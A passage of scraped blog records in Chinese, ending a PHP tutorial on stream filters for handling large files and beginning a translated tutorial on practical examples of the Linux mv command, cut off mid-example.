id=\"crayon-5a634cc88c98e839480669-4\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-i\">filter</span> <span class=\"crayon-sy\">(</span> <span class=\"crayon-i\">resource</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-st\">in</span> <span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">resource</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">out</span> <span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-o\">&amp;</span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">consumed</span> <span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c98e839480669-5\">        <span class=\"crayon-t\">bool</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">closing</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c98e839480669-6\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-i\">onClose</span> <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c98e839480669-7\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-i\">onCreate</span> <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c98e839480669-8\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p>这可以很容易地注册：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c991256366028\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$handle = fopen(\"story.txt\", \"w+\");\r\nstream_filter_append($handle, \"highlight-names\", STREAM_FILTER_READ);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c991256366028-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c991256366028-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c991256366028-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">handle</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">fopen</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"story.txt\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-s\">\"w+\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c991256366028-2\"><span class=\"crayon-e\">stream_filter_append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-s\">\"highlight-names\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">STREAM_FILTER_READ</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>突出显示名称需要匹配新的筛选器类的filtername属性。也可以在php：//filter/highligh-names/resource=story.txt字符串中使用自定义过滤器。定义过滤器比定义协议要容易得多。因为协议需要处理目录操作，而过滤器只需处理每个数据块。</p>\n<p>如果你有这个想法，我强烈建议你尝试创建自定义协议和过滤器。如果你可以将过滤器应用于stream_copy_to_streamoperations，那么即使在使用大容量文件时，你的应用程序也可以在没有内存的情况下使用。想象一下，编写一个调整大小的图像过滤器或加密的应用程序过滤器。</p>\n<h2>总结</h2>\n<p>虽然这不是我们经常遇到的问题，但在处理大文件时很容易搞砸。在异步应用程序中，当我们不注意小心使用内存的话，很容易导致整个服务器宕机。<br>\n本教程希望向你介绍一些新的想法（或者让你重新认识他们），以便你可以更多地考虑如何高效地读取和写入大型文件。当我们开始熟悉流程和生成器，并停止使用像file_get_contents这样的函数时，我们的应用程序中就会减少错误的类别，这看起来是很好。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113339\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113339votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113339\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/63dbb7a09172c6338db7eec551434b92d3899476.jpg"}
{"url_object_id": "b2be77988c2b81aa8c8c5c8a69811c1a", "title": "Linux 移动或重命名文件/目录－mv 的10个实用例子", "url": "http://blog.jobbole.com/113352/", "create_date": "2017/12/18", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/12/0ffd848e786b38cbd9e7fe73b8a984f9.png"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 1, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://linoxide.com/linux-command/mv-command-linux/\">Pungki Arianto</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-2688-1.html\">Linux中国/Linchenguang</a>   </div><p>熟悉了 <a href=\"http://linux.cn/article-2687-1.html\">复制命令</a>，下一个相关的命令就是 mv 命令。当你想要将文件从一个位置移动到另一个地方并且不想复制它，那么<strong>mv 命令</strong>是完成这个任务的首选。</p>\n<h3>初识 mv 命令</h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/0ffd848e786b38cbd9e7fe73b8a984f9.png\" alt=\"\" width=\"512\" height=\"512\"></p>\n<p>mv 命令是一个与<strong>cp</strong>类似的命令，但是它<strong>并非</strong>创建文件或目录的复制品/副本。不管你在使用什么版本的Linux系统，mv 都默认安装在你的Linux系统上了。来看一下 mv 命令在日常操作中的一些例子。</p>\n<h4>1.移动文件</h4>\n<p>移动文件时需要注意的是文件的源地址和目标地址<strong>必须不同</strong>。这里有个例子，想要将<strong>file_1.txt</strong>文件从当前目录移动到其它目录，以<strong>/home/pungki/</strong>为例，语法应该如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3472092298572834\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mv file_1.txt /home/pungki/office</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3472092298572834-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3472092298572834-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mv </span><span class=\"crayon-v\">file_1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">pungki</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">office</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/4337b72366dcd1d179e54f6733353c31.png\" alt=\"mv command\"></p>\n<p>如我们所见，当我们移动 file_1.txt 文件时，先前目录的 file<em>_</em>1.txt 就<strong>被删除了</strong>。</p>\n<h4>2.移动多个文件</h4>\n<p>如果想一次移动多个文件，我们可以将他们放在一行并用空格分开。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a347209a156960372\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mv file_2.txt file_3.txt file_4.txt /home/pungki/office</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a347209a156960372-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a347209a156960372-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mv </span><span class=\"crayon-v\">file_2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">file_3</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">file_4</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">pungki</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">office</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/b2638990e4d535ef720494594f82aeff.png\" alt=\"Move multiple files\"></p>\n<p>如果你的文件有规律可循的话那么你就可以使用通配符。比如，为了移除所有以<strong>.txt</strong>为扩展名的文件，我们可以用下面的命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a347209f527947009\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mv *.txt /home/pungki/office</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a347209f527947009-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a347209f527947009-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">mv *</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">pungki</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">office</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/001cbc57d22fd5836324e4c34ff49a98.png\" alt=\"Move using pattern\"></p>\n<h4>3.移动目录</h4>\n<p>不同于复制命令，用 mv 命令移动目录相当直接。移动目录你可以使用不带选项的 mv 命令。看下面的截图就一目了然了。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/6097ea1227a2aacc6f5da69ab6ba228a.png\" alt=\"Moving directory\"></p>\n<h4>4.重命名文件或目录</h4>\n<p>我们也用 mv 命令来重命名文件或目录。不过目标位置和源位置必须相同才可以。然后文件名必须不同。</p>\n<p>假定我们当前所在目录为<strong>/home/pungki/Documents</strong>，而我们想将<strong>file_1.txt重命名为file_2.txt</strong>。那么命令应该如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a34720a3474092563\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mv file_1.txt file_2.txt</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a34720a3474092563-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a34720a3474092563-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mv </span><span class=\"crayon-v\">file_1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">file_2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>如果是绝对路径，它应该像下面这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a34720a8525629245\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mv /home/pungki/Documents/file_1.txt /home/pungki/Documents/file_2.txt</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a34720a8525629245-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a34720a8525629245-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mv</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">pungki</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Documents</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">file_1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">pungki</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Documents</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">file_2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/d10e2e03d32e0a5970da8ce2cdbc0254.png\" alt=\"Renaming file\"></p>\n<h4>5. 重命名目录</h4>\n<p>上一段的规则同样适用于目录。请看这个例子：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a34720ac332905798\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mv directory_1/ directory_2/</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a34720ac332905798-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" 